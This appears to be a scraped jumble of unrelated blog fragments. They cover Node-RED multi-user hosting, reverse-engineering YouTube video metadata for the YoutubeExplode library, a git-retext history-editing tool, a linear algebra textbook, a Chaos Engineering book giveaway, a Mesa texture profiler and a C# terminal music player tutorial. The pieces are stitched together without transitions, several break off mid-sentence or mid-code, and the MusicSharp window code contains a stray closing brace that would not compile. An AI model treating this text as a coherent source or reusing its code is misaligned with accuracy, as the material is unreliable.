<p>We are going to need a way to only allow right users access to the Node-RED editor, again there is a plugin <a href="https://nodered.org/docs/user-guide/runtime/securing-node-red#custom-user-authentication">API</a> that allows this to be wired into nearly any existing authentication source of your choice.</p>



<p>I wrote a simple implementation of this API which uses <a href="https://www.hardill.me.uk/wordpress/2015/05/11/securing-node-red/" data-type="post" data-id="2075">LDAP</a> as the source of users not long after Node-RED was released . But in this series of post I’ll write a new one that uses the same backend database as the flow storage plugin.</p>



<figure></figure>



<h3>Custom Container</h3>



<p>Once we’ve built storage and authentication plugins we will need to build a custom version of the Node-RED Docker container that includes these extras.</p>



<figure></figure>



<h3>HTTP Reverse Proxy</h3>



<p>Now we have a collection of containers each running a users instance of Node-RED we are going to need a way to expose these to the outside world. Since Node-RED is a web application then a HTTP Reverse Proxy is probably the right way forward. </p>



<figure></figure>



<h3>Management</h3>



<p>Once all of the other pieces are in place we need is a way to control the creation/deletion of Node-RED instances. It will also be useful to see the instances’ logs.</p>



<figure></figure>



<h3>Extra bits</h3>



<p>Finally I’ll cover some extra bits that help make a deployment specific to a particular environment, such as</p>



<h4>Custom node repository</h4>



<p>This allows you to host your own private nodes and still install them using the Manage Palette menu.</p>



<h4>Custom Theme </h4>



<p>Tweaking page titles and colour schemes can make Node-RED fit in better with your existing look and feel.</p>



<figure></figure>



<h2>Working Example</h2>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Almost a year ago, I started developing <a href="https://github.com/Tyrrrz/YoutubeExplode">YoutubeExplode</a>, a library that scraps information on YouTube videos and lets you download them. Originally, my main motivation for developing it was simply to gain experience, as the task involved a lot of research and reverse-engineering. Nowadays, YoutubeExplode is arguably the most consistent and robust .NET library for dealing with YouTube.</p>
<p>Since this is a relatively popular discussion topic among many beginner developers, I thought that I could help out by sharing the knowledge I found by spending dozens of hours staring at Chrome Developer Tools.</p>
<p><em>Note: even though the base principles explained here are unlikely to change, some information in this post may become outdated. This post is relevant to YoutubeExplode v4.1 (16-Feb-2018).</em></p>
<h2>Getting video metadata</h2>
<p>In order to find and resolve media streams, you need to first get video metadata. There are a few ways to do it, but the most reliable one is by querying an AJAX endpoint used internally by YouTube’s iframe embed API. The format is as follows: <a href="https://www.youtube.com/get_video_info?video_id=%7BvideoId%7D">https://www.youtube.com/get_video_info?video_id={videoId}</a>.</p>
<p>The request can take a lot of different parameters, but at a minimum it needs a video ID — the value in the URL that comes after <code>/watch?v=</code>, for example <code>e_S9VvJM1PI</code>.</p>
<p>The response contains URL-encoded metadata, which has to be decoded first before it’s usable. After that, you can map the parameter names to values in a dictionary for easier access. Some parameter values are nested objects themselves, so they can in turn be mapped to nested dictionaries.</p>
<p>Here’s an example of the decoded metadata (truncated for brevity):</p>
<div data-language="ini"><pre><code><span>status</span><span><span>=</span>ok</span>

<p>As you can see, there is quite a lot of information that can be extracted straight away.</p>
<p>Let’s also look at some important optional parameters that this request can take:</p>
<ul>
<li><code>hl</code> — name of the culture used to localize some strings. If not set, it defaults to culture inferred from your IP. Use <code>hl=en</code> to force English language on all strings.</li>
<li><code>el</code> — type of YouTube page from where the request was made. This decides what kind of information will be available in the response. In some cases, you will need to set this parameter to a certain value depending on the type of the video, in order to avoid errors. Defaults to <code>embedded</code>.</li>
<li><code>sts</code> — some kind of session identifier, used to synchronize information between requests. Defaults to empty.</li>
</ul>
<h3>The “el” parameter</h3>
<p>The <code>el</code> request parameter can take multiple values and it affects what kind of data you will receive as a response. There are only a few that actually matter though, so I’ll list them here:</p>
<ul>
<li><code>embedded</code>, the default value. YouTube uses this when requesting information for embedded videos. Doesn’t work with videos that aren’t embeddable, but works with age-restricted videos.</li>
<li><code>detailpage</code>, alternative value, contains a bit more info. Conversely, works with videos that aren’t embeddable, but doesn’t work with age-restricted videos.</li>
</ul>
<p>YoutubeExplode uses <code>el=embedded</code> for the first query. If it fails because the video cannot be embedded, it then retries with <code>el=detailpage</code>.</p>
<h3>Handling errors</h3>
<p>When the request fails, the response will contain only a few fields:</p>
<ul>
<li><code>status</code> — which is equal to <code>fail</code>.</li>
<li><code>errorcode</code> — an integer code that identifies the error.</li>
<li><code>reason</code> — text message that explains why the video is not available.</li>
</ul>
<p>Error codes seem to be very generic and most of the time it’s either <code>100</code> or <code>150</code> so they aren’t very useful at determining what went wrong.</p>
<h3>Paid videos</h3>
<p>Some videos need to be purchased before they can be watched. In such cases, there will be:</p>
<ul>
<li><code>requires_purchase</code>, which equal to <code>1</code>.</li>
<li><code>ypc_vid</code>, ID of a preview video which can be watched for free.</li>
</ul>
<h2>Resolving media streams</h2>
<p>Media streams and their metadata come in many different forms.</p>
<h3>Muxed streams</h3>
<p>Multiplexed (muxed) streams are the type that contain both video and audio tracks in the same stream. YouTube provides these streams only in low qualities — the best they can be is 720p30.</p>
<p>Metadata for these streams is contained within the URL-encoded response mentioned earlier, inside the <code>url_encoded_fmt_stream_map</code> parameter. To extract it, you simply need to split the value by <code>,</code> and then URL-decode each part.</p>
<p>This is how decoded metadata looks, for an individual muxed stream:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>43</span>
<span>type</span><span><span>=</span>video/webm; codecs="vp8.0, vorbis"</span>
<span>fallback_host</span><span><span>=</span>redirector.googlevideo.com</span>
<span>url</span><span><span>=</span>https://r12---sn-3c27sn7k.googlevideo.com/videoplayback?itag=43&amp;lmt=1367519763212098&amp;ipbits=0&amp;key=yt6&amp;mime=video%2Fwebm&amp;expire=1511401259&amp;mn=sn-3c27sn7k&amp;mm=31&amp;ms=au&amp;mv=m&amp;mt=1511379591&amp;ei=y9IVWuuyKI-YdLvnm8AO&amp;sparams=dur%2Cei%2Cgcr%2Cid%2Cinitcwndbps%2Cip%2Cipbits%2Citag%2Clmt%2Cmime%2Cmm%2Cmn%2Cms%2Cmv%2Cnh%2Cpl%2Cratebypass%2Crequiressl%2Csource%2Cexpire&amp;ip=255.255.255.255&amp;id=o-AJuM11wvxuVl2WBgfb3nr6zbmXsFGQvhMelDobZ_KOrE&amp;nh=IgpwcjAxLmticDAxKgkxMjcuMC4wLjE&amp;requiressl=yes&amp;gcr=ua&amp;source=youtube&amp;ratebypass=yes&amp;pl=24&amp;initcwndbps=1112500&amp;dur=0.000</span>
<span>s</span><span><span>=</span>9599599594B0133328AA570AE0129E58478D7BCE9D226F.15ABC404267945A3F64FB4E42074383FC4FA80F5</span>
<span>quality</span><span><span>=</span>medium</span></code></pre></div>
<p>You will be interested in the following properties:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
</ul>
<p>Note: I’ve encountered cases when <a href="https://github.com/Tyrrrz/YoutubeExplode/issues/36">some of the muxed streams were removed</a> despite still appearing in the metadata. Therefore it’s recommended to send HEAD requests to check that each stream is still available. You can get content length as well while you’re at it, since it’s not present in the metadata.</p>
<h3>Adaptive streams</h3>
<p>YouTube also uses video-only and audio-only streams. These come at highest available qualities, with no limitations.</p>
<p>Similarly to muxed streams, metadata for these streams can be extracted from <code>adaptive_fmts</code> parameter. Here’s how it looks:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>134</span>

<p>Adaptive streams have a slightly extended set of properties. I’ll list the useful ones:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
<li><code>clen</code> — content length of the stream in bytes.</li>
<li><code>bitrate</code> — stream bitrate in kbit/sec.</li>
<li><code>size</code> — video resolution (video-only).</li>
<li><code>fps</code> — video framerate (video-only).</li>
</ul>
<h3>Adaptive streams in DASH manifest</h3>
<p>Video info may contain URL of a DASH manifest inside the <code>dashmpd</code> parameter. It’s not always present and some videos might never have it at all.</p>
<p>To resolve metadata of these streams, you need to first download the manifest using the provided URL. Sometimes a manifest can be protected. If it is, you should be able to find the signature inside the URL — it’s the value separated by slashes that comes after <code>/s/</code>.</p>
<p>Streams in DASH can also be segmented — each segment starting at a given point and lasting only a second or two. This is the type that your browser normally uses when playing a video on YouTube — it lets it easily adjust quality based on network conditions. Segmented streams are also used for livestream videos. This post will not be covering them, however, as processing them is not required to download videos.</p>
<p>The DASH manifest follows <a href="http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd">this XML schema</a>. You can parse the stream metadata if you go through all descendant nodes of type <code>Representation</code>. Here’s how they appear:</p>
<div data-language="xml"><pre><code><span><span><span>&lt;</span>Representation</span> <span>id</span><span><span>=</span><span>"</span>133<span>"</span></span> <span>codecs</span><span><span>=</span><span>"</span>avc1.4d4015<span>"</span></span> <span>width</span><span><span>=</span><span>"</span>426<span>"</span></span>

<article>
    
    

    <div>
      <p>This is the second post in a series to expand on various utilities I wrote to
assist my work with Git.  Some of these utilities are located in a repository
on Github called <a href="https://github.com/da-x/misc-gitology">misc-gitology</a>.</p>
<p>Previous post: <a href="https://blog.aloni.org/posts/gitology-1-git-flip-history">#1</a>.</p>
<p>Today I'll introduce the commit rewriter - <code>git-retext</code>.</p>
<h2 id="familiar-ways-of-git-history-editing">Familiar ways of Git history editing</h2>
<p>In the previous post I mentioned the desire to present a clear Git history to
reviewers. Sometimes, we are reviewing our own unpublished Git history and
would like to do some polishing here and there before pushing it to a
remote repository.</p>
<p>There are multitude of ways in which editing the history can be done:</p>
<ul>
<li><code>git commit --amend</code>, with or without <code>-a</code> (in the later <code>git add</code> is used). This
takes care of the <code>HEAD</code> commit, but not commits that are earlier to it.</li>
<li><code>git rebase</code>, where you labor on a fixup commit or a set of them,
with or without <code>--interactive</code>, with or without <code>--autosquash</code>, so that
the fixup changes amend commits further down the history. There are tools such
as <a href="https://github.com/tummychow/git-absorb">git-absorb</a> that can be used to
automate creation of fixup commits.</li>
<li><code>git-filter-branch</code>, a big hammer that lets you run a command per a commit,
where the result of a command is the rewritten tree. Obviously not
quite suitable for easy 'final touches'.</li>
<li>Editor environment features. In Emacs, <a href="https://magit.vc/">Magit</a>, and in
Vim, <a href="https://github.com/jreybert/vimagit">Vimagit</a>, and possibly other editors
have their own Git integrations, some are elaborate enough to ease on editing
the history. However, to each his own, and belaboring on a certain editor
environment would get us off-topic.</li>
</ul>
<h2 id="a-new-way-git-retext">A new way - <code>git-retext</code></h2>
<p>In the process of reviewing, we are most likely looking at diffs. What if it
was possible in an environment-independent way, to just edit the diff? </p>
<p>In the pre-cursor to the invention of Git, developers used emails (and some are
still using emails) in order to pass along changes to one another. The <code>git format-patch</code> command knows how to turn a list of commits into such emails. As
plain text emails can be easily edited by a text editor, it stands to reason
that we can edit changes in-place, if we momentarily turn commits into emails
and back.</p>
<p>This is what <code>git-retext</code> essentially lets you do.</p>
<p>For example, we want to edit the most recent commit in the history. Let's issue
the command:</p>

<p>This <code>git-retext</code> command turns the <code>HEAD~1..HEAD</code> range into emails and we
immediately find ourselves thrown into editing in the default text editor that
we configured, either in Git's configuration, or <code>EDITOR</code> environment variable.
The "thrown into editor" situation should not be foreign to Git users, as it is
done in the default <code>git commit</code> or <code>git rebase -i</code> workflows.</p>
<p>Here's an example for such <code>git-retext HEAD~1</code> invocation at one of my
repositories:</p>

<p>This is how a commit looks like when it is sent by email. It is possible to
edit the first line of the commit in the <code>Subject: </code> ; and the details of the
commit message before the <code>---</code>, and the diff itself. About the diff, we don't
have to fix the unidiff's meta-data, because <code>git-retext</code>'s processing will
take care of it instead.</p>
<p>Saving the temporary and exiting, <code>git-retext</code> will try to apply the edited
commits using <code>git am</code>. If we have carefully edited them, they should
apply cleanly. The resultant <code>HEAD</code> is the edited history.</p>
<p>Of course, this new method is not perfect, but it's a time saver for certain
set of editing activities. After getting accustomed to it, you may start
reviewing changes in <code>git-retext</code> even if you are not ending up modifying them,
instead of running <code>git-diff</code> or viewing a diff made by the editor environment.</p>
<h2 id="advantages">Advantages</h2>
<ul>
<li>Easy to amend changes right when they are being reviewed, as long as
the editing is not too complicated. Adding new diff lines inside hunks
is possible.</li>
<li>Easy to do search and replace on the changes themselves, and that also takes
care of the commit message, and added filenames if relevant.</li>
<li>It is possible to remove unwanted diff hunks.</li>
<li>Splitting of commits to small new commits is possible by adding a new email
header in between hunks (no need to edit the diffstat).</li>
</ul>
<h2 id="disadvantages">Disadvantages</h2>
<ul>
<li>If there is more than one commit and they are dependent on one another, we
must be more careful so that the editing is consistent, and that the diff hunk
context is correct.</li>
<li>It's easy to mess up the editing and discover the mess only when <code>git-retext</code>
fails to apply the changes.</li>
</ul>
<p>Future enhancements of <code>git-retext</code> should assist in avoiding mistakes during
editing, perhaps with better editor integration.</p>

<p><code>git-retext</code> is Python 3 script that relies on <code>recountdiff</code> in order to fix
the edited diffs. The underlying git commands being used are
<code>git-format-patch</code>, <code>git-am</code>, and <code>git-reset</code>.</p>

          </li>
	  
	  <li><span>Developmental approach</span>
	    The book proves all of the results
	    but does not start by assuming that 
	    students are already able at abstract work.
	    Instead, it proceeds with a great deal of
	    motivation, many computational examples, 
            and many exercises.
	    The goal is to raise 
            each student's level of 
	    mathematical maturity.
          </li>
	  
	  <li><span>Extensive exercise sets</span>   
            Each subsection has a wide range of exercises,
            from 
	    routine verifications to a few challenges.
	    The
	    <a href="http://joshua.smcvt.edu/linearalgebra/jhanswer.pdf">solution book</a>
	    has each answer completely worked.
	    In addition, clicking on a problem 
	    takes you to its answer
	    while clicking on the answer takes you back to the problem.
          </li>
	  
	  <li><span>Popular</span>

<p>I was hired at Netflix to lead the Traffic Team in early 2015. A few weeks later I was also asked to charter a Chaos Engineering Team. At the time, Chaos Engineering was essentially a program called Chaos Monkey with a few supporting blog posts. I wanted to get a feel for what our engineers thought about the practice, so I asked around: “What is Chaos Engineering?” The response I usually heard was, “Oh, that’s when we break stuff in production.”</p>



<p>As cool as that sounds, I could break stuff in production all day long and not provide any value to Netflix. I wanted to keep my job, not cause pointless havoc. So instead, I sat down with my team and defined Chaos Engineering as a proactive discipline to improve availability. We borrowed heavily from the field of Resilience Engineering and other research outside of the software industry to frame a practice of experimentation that follows in the best traditions of western science. Our definition is still published at <a href="http://principlesofchaos.org/" target="_blank" rel="noreferrer noopener">http://principlesofchaos.org/</a>. The point of Chaos Engineering isn’t to create chaos; it’s to chart a path of confidence through the chaos.</p>



<p>Working at Netflix was a highlight of my journey with Chaos Engineering. Another is co-authoring and publishing “Chaos Engineering: System Resiliency in Practice” with Nora Jones (Jeli.io). And now I am thrilled to have the opportunity to give away free e-copies of my book.</p>



<h2>Why Chaos Engineering is So Important Now</h2>



<p>Remote communication is literally saving lives during the pandemic. Never before have so many people relied on digital infrastructure to perform even basic tasks like getting food. The massive migration to remote work and remote education has irrevocably changed the course of societal structures, norms, and communication.</p>



<p>Work and school for hundreds of millions of people moved online in a matter of weeks. This is a monumental change to the most complex sociotechnical system we will ever be a part of. We don’t have access to a control group in this experiment. We only have one shot to get this right. The stakes are high.</p>



<p>With high stakes comes the opportunity for high value. The safety and reliability of the digital systems that we are suddenly so dependent on has never been more obvious. We have the opportunity and the responsibility to innovate in the areas of availability and security, to make these systems better in ways that matter to people.</p>



<p>The old methods won’t cut it. They aren’t bad, but they aren’t sufficient. Incident response management, alerting, metrics/logging, disaster recovery—all great, but also all reactive. They focus on time-to-detect and time-to-remediate. We need proactive methods. TDD, pair programming, peer code reviews, syntax scanning, QA—also great, but they won’t move the needle on availability or security in a complex system. You can’t expect a human to provide safety guarantees on something (a complex distributed system) that by definition is beyond the capability of a human to mentally model.</p>



<p>Chaos Engineering is a proactive approach to improving the safety properties of complex systems. We have an imperative to lean into these new, innovative approaches to help us cope with the increasing complexity and stress that our organizations are in. If you feel like your organization is facing unprecedented demands and requirements from a reliability perspective, you are in good company: most of us operating systems at scale are in that same position. With Chaos Engineering, you have an opportunity to meet those demands and navigate that complexity.</p>



<h2><strong>In the Book</strong></h2>



<p>This book explains where Chaos Engineering came from and provides some mental models to challenge the current mainstream thinking on system reliability. We then provide chapters contributed by authors from Slack, Google, Microsoft, LinkedIn, and CapitalOne, so that you can hear in their own words how people responsible for critical systems at scale are embracing Chaos Engineering to meet the challenges of the day. We also explore a bit outside of the typical boundaries of distributed software engineering to take a look at the future of the practice as well as its impact in manufacturing, autonomous vehicles, human systems, cyber security, and Continuous Verification.</p>



<h2><strong>We Want You to Have the Book… for Free</strong></h2>



<p>Nora and I wrote the most comprehensive, practical guide to Chaos Engineering. We even dedicated an entire chapter to establishing ROI so that you can see how Chaos Engineering has a positive effect. </p>



<p>Now Verica is sponsoring this book so that we can send you a digital copy for free. As a company, we believe the concepts explored within have the potential to completely change for the better how people build, operate, and maintain systems at scale. To get your free copy, go to <a href="https://www.verica.io/book/">verica.io/book</a>.</p>

								“A new practice is emerging that builds on the advantages established by CI/CD.
								Continuous Verification (CV) often manifests as a stage in a pipeline, but it can
								also run independently during business hours, verifying assumptions about the
								behavior of a system. Much like Chaos Engineering, CV platforms can include
								Availability or Security components and often express these as hypotheses. Like
								CI/CD, the practice is born out of a need to navigate increasingly complex systems.
								Organizations do not have the time or other resources to validate that the internal
								machinations of the system work as intended, so instead they verify that the output
								of the system is inline with expectations. This is the preference for verification
								over validation that hallmarks successful management of complex systems.”
							</p>
						</div>
						<p>
							There are many properties of a complex system that cannot be designed in the traditional
							sense, but that a business still needs to optimize. Take availability as an example.
							There are many approaches to improving availability. Some examples include: Incident
							Management, Alerting, Service Degradation, Observability Instrumentation, Disaster
							Recovery, Postmortem Facilitation, etc. What all of these approaches have in common is
							that they are aimed at improving time to detection (TTD) and time to remediation (TTR)
							of an incident. They are all reactive.
						</p>
						<p>
							When we sat down to define Chaos Engineering, we set out to build a discipline that was
							proactive. Chaos Engineering draws from the rich history of empirical experimentation to
							proactively discover vulnerabilities in complex systems. The culmination of this was the
							Chaos Automation Platform (ChAP) built by my team at Netflix.

	One of the big determinants of OpenGL performance is texture
	usage; if an application starts using more textures than fit
	into the graphics card memory, performance can drop
	dramatically.
      </p>
      <p>
	texturetop is something I cooked up to allow easily getting a
	view of the texture usage of a client using the open-source
	Mesa/DRI implementation of libGL. It consists of two pieces;
	a patch for Mesa that provides a generic texture profiling
	hook and a small text mode client along the lines of the
	classic 'top' that uses the profiling hook.
      </p>
      <p>
	The way that the texture profiling hook works is that if an
	environment variable LIBGL_PROFILE_SERVER is set, a separate
	thread is created that connects to the specified profiling
	server and waits for commands for the server. The only command
	at the current time (other than startup/shutdown) is a request
	for changes to the current state since the last update.
      </p>
      <p>
	Some small driver modifications are needed to hook up to this
	profiling infrastructure. In the current version of the patch,
	only the Savage driver is modified, so it probably won't
	do anything for your video card without a little work.
      </p>
      <p>
	The information that texturetop displays is:
      </p>
      <ul>
	<li>Number and size of available texture heaps (Card, AGP,
	etc.)</li>
	<li>For each texture
	  <ul>
	    <li>Width and height of the texture</li>
	    <li>Bytes used in main client memory</li>
	    <li>Current heap for the texture, if any</li>
	    <li>Time texture has been in that heap</li>
	    <li>Bytes used in that heap</li>

        <p><i>Note: Part two of this guide is now <a href="https://markjames.dev/2020-10-29-developing-tui-music-player-csharp-part-two/" target="_blank">available here!</a><i></i></i></p>

<p>Recently, I’ve been listening to a lot of <a href="https://somafm.com/" target="_blank">SomaFM</a> internet radio streams while I work as they have a lot of terrific commercial-free programming. One day while being creatively inspired by the Sonic Universe station’s offerings, I had the idea of creating my own music player with support for streaming. Not only would this be a great project for continuing to learn C# and Dotnet Core, but it would also allow me to build a simple, lightweight player customized to my liking! After a brainstorming session, I came up with the name MusicSharp and a core list of features I planned to implement:</p>

<ul>
  <li>Play audio files and streams</li>
  <li>Save and load playlists</li>
  <li>Be lightweight</li>
  <li>Be CLI-based</li>
</ul>

<p>Moreover, I also wanted to make sure that I made use of Test Driven Development and code linting within the project. For this project, I’m making use of Stylecop to enfore proper code style. For the curious, you can view the entire MusicSharp code repository in its current state <a href="https://github.com/markjamesm/MusicSharp" target="_blank">on Github</a>. I highly recommend following the repo to keep up to date with the latest commits (and a star wouldn’t be too bad either :-P)!</p>

<h2 id="getting-started">Getting Started</h2>

<p>Armed with a name and an idea, the next thing I needed was to settle on was which C# libraries I would use to implement the UI and audio functionality. After doing some research, I decided that the optimal solution would be to use <a href="https://github.com/migueldeicaza/gui.cs" target="_blank">Terminal.Gui</a> for the UI elements and <a href="https://github.com/naudio/NAudio" target="_blank">NAudio</a> to handle the audio side of things. Created by Miuel de Icaza (the creator of Mono and Xamarin), Terminal.Gui is a cross-platform library for building console-based applications that work on monochrome terminals as well as modern terminals with mouse support. Leveraging Termnial.Gui to build the UI, I chose NAudio to handle the audio playing capabilities of MusicSharp as its a mature C# library.</p>

<h2 id="mocking-up-a-simple-ui">Mocking up a simple UI</h2>

<p>With some of the preliminary items out of the way, my next step was to work on some wireframe mockups to see what kind of UI I might want to create. I’ve used a lot of music players over my life (including CLI ones), and so I have a good idea of what music players should have. Slowly, I started breaking down the different elements I thought would need and came up with the following:</p>

<ul>
  <li>A menu bar</li>
  <li>A status bar</li>
  <li>A player section (with associated controls)</li>
  <li>A playlist browser</li>
</ul>

<p>I sketched out a few different UI layouts until I came up with the following which I felt would work for a first iteration:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-ui-mockup.png" width="366" height="302" alt="MusicSharp UI mockup"></p>

<h2 id="building-the-main-window">Building the Main Window</h2>

<p>Mockup in hand, I started diving into the Terminal.gui API docs in order to build my first window. I created a new Gui class in a file called Gui.cs with a method named Start(). Inside the Start method, I initialized Terminal.Gui and created a simple top-level window. Note that</p>

<div><div><pre><code><span>namespace</span> <span>MusicSharp</span>
<span>{</span>
    <span>using</span> <span>Terminal.Gui</span><span>;</span>

    <span>/// &lt;summary&gt;</span>
    <span>/// The Gui class houses the CLI elements of MusicSharp.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>class</span> <span>Gui</span>
    <span>{</span>
        <span>/// &lt;summary&gt;</span>
        <span>/// The Start method builds the user interface.</span>
        <span>/// &lt;/summary&gt;</span>
        <span>public</span> <span>void</span> <span>Start</span><span>()</span>
        <span>{</span>
            <span>// Creates a instance of MainLoop to process input events, handle timers and other sources of data.</span>
            <span>Application</span><span>.</span><span>Init</span><span>();</span>

            <span>var</span> <span>top</span> <span>=</span> <span>Application</span><span>.</span><span>Top</span><span>;</span>
            <span>var</span> <span>tframe</span> <span>=</span> <span>top</span><span>.</span><span>Frame</span><span>;</span>

            <span>// Create the top-level window.</span>
            <span>var</span> <span>win</span> <span>=</span> <span>new</span> <span>Window</span><span>(</span><span>"MusicSharp"</span><span>)</span>
            <span>{</span>
                <span>X</span> <span>=</span> <span>0</span><span>,</span>
                <span>Y</span> <span>=</span> <span>1</span><span>,</span> <span>// Leave one row for the toplevel menu</span>

                <span>// By using Dim.Fill(), it will automatically resize without manual intervention</span>
                <span>Width</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>(),</span>

                <span>// Subtract one row for the statusbar</span>
                <span>Height</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>()</span> <span>-</span> <span>1</span><span>,</span>
            <span>};</span>
            <span>});</span>

            <span>// Add the layout elements and run the app.</span>
            <span>top</span><span>.</span><span>Add</span><span>(</span><span>win</span><span>);</span>
            <span>Application</span><span>.</span><span>Run</span><span>();</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Inside my Program.cs file, I called the Start method like so:</p>

<div><div><pre><code>    <span>public</span> <span>static</span> <span>void</span> <span>Main</span><span>()</span>
    <span>{</span>
        <span>// Start MusicSharp.</span>
        <span>Gui</span> <span>gui</span> <span>=</span> <span>new</span> <span>Gui</span><span>();</span>
        <span>gui</span><span>.</span><span>Start</span><span>();</span>
    <span>}</span>
</code></pre></div></div>

<p>Running the program in this state produced the following result:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-first-build.png" width="750" height="402" alt="MusicSharp first build screenshot"></p>

<p>Success! We now have a top level window which dynamically resizes while leaving space on the top and bottom of the screen for statusbars.</p>



<p>The next step was to implement a top level menu, and fortunately this was easy to do with Terminal.Gui. Just aboce top.Add(win), I created the following code:</p>

<div><div><pre><code><span>// Create the menubar.</span>
<span>var</span> <span>menu</span> <span>=</span> <span>new</span> <span>MenuBar</span><span>(</span><span>new</span> <span>MenuBarItem</span><span>[]</span>
<span>{</span>
    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_File"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open Stream"</span><span>,</span> <span>"Open a stream"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Quit"</span><span>,</span> <span>"Exit MusicSharp"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>
    <span>}),</span>

    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_Help"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_About"</span><span>,</span> <span>string</span><span>.</span><span>Empty</span><span>,</span> <span>()</span> <span>=&gt;</span>
        <span>{</span>
            <span>MessageBox</span><span>.</span><span>Query</span><span>(</span><span>"Music Sharp 0.2.0"</span><span>,</span> <span>"\nMusic Sharp is a lightweight CLI\n music player written in C#.\n\nDeveloped by Mark-James McDougall\nand licensed under the GPL v3.\n "</span><span>,</span> <span>"Close"</span><span>);</span>
        <span>}),</span>
    <span>}),</span>
<span>});</span>
</code></pre></div></div>

<p>Here, I did a few things. Firstly, I created a new MenuBar which will house the Menu Bar Items. Next, I created each menu item (File and Help), and populated them with handy child items that we’ll need in our UI. These children take a name, optional descriptor, and a method as arguments, and for now I’m calling Application.RequestStop() on each of them to exit the application (Later I’ll be replacing these with the actual methods once I write them). In addition, I also created a simple about dialog box as a way to familiarize myself with Terminal.Gui. Compiling our code up to this point produces the following menu:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-menu.png" width="750" height="446" alt="Screenshot of the MusicSharp menu bar"></p>

<p>And a neat looking about dialog:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-about-dialog.png" width="750" height="446" alt="Screenshot of the MusicSharp about dialog"></p>

<p>Although I still need to add some additional menu items (such as save/load playlist functionality), this gives us a great jumping off point for the next part, getting basic audio functionality working!</p>

<h2 id="playing-audio">Playing Audio</h2>

<p>Now that a very simple UI had been created, my next order of business was to test out NAudio and see how I could play an MP3 file as a simple proof of concept. In order to do so, I created a new file called Player.cs to house the audio playing related functions.</p>

<p>Inside the Player class, I created a PlayAudioFile() method which read an MP3 file from a static location on my PC and then played it using NAudio. The code looked like this:</p>

<div><div><pre><code><span>/// &lt;summary&gt;</span>
<span>/// The Player class handles audio playback.</span>
<span>/// &lt;/summary&gt;</span>
<span>public</span> <span>static</span> <span>class</span> <span>Player</span>
<span>{</span>
    <span>/// &lt;summary&gt;</span>
    <span>/// Method that implements audio playback from a file.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>static</span> <span>void</span> <span>PlayAudioFile</span><span>()</span>
    <span>{</span>
        <span>string</span> <span>file</span> <span>=</span> <span>@"C:\MusicSharp\Zhund-Dusty.mp3"</span><span>;</span>

        <span>// Load the audio file and select an output device.</span>
        <span>using</span> <span>var</span> <span>audioFile</span> <span>=</span> <span>new</span> <span>AudioFileReader</span><span>(</span><span>file</span><span>);</span>
        <span>using</span> <span>var</span> <span>outputDevice</span> <span>=</span> <span>new</span> <span>WaveOutEvent</span><span>();</span>

        <span>outputDevice</span><span>.</span><span>Init</span><span>(</span><span>audioFile</span><span>);</span>
        <span>outputDevice</span><span>.</span><span>Play</span><span>();</span>

        <span>// Sleep until playback is finished.</span>
        <span>while</span> <span>(</span><span>outputDevice</span><span>.</span><span>PlaybackState</span> <span>==</span> <span>PlaybackState</span><span>.</span><span>Playing</span><span>)</span>
        <span>{</span>
            <span>Thread</span><span>.</span><span>Sleep</span><span>(</span><span>1000</span><span>);</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The last order of business was to wire up the PlayAudioFile() method to the UI, and I did so by replacing the Open menu line of code in Gui.cs to the following:</p>

<div><div><pre><code><span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Player</span><span>.</span><span>PlayAudioFile</span><span>()),</span>
</code></pre></div></div>

<p>After compiling and opening the player, I was now greeted with the sweet sounds of music! Although it was exciting to hear music this early on, there were quite a few catches however. These included:</p>

<ul>
  <li>No exception handling if the MP3 file is missing</li>
  <li>No way to load other music files</li>
  <li>Missing playback controls and volume</li>
  <li>Playback status indicator</li>
</ul>

<p>Although these features were missing, I still find it quite exciting whenever I’m able to make tangible progress in a project and it provides some motivation to work through some of the more tedious parts.</p>



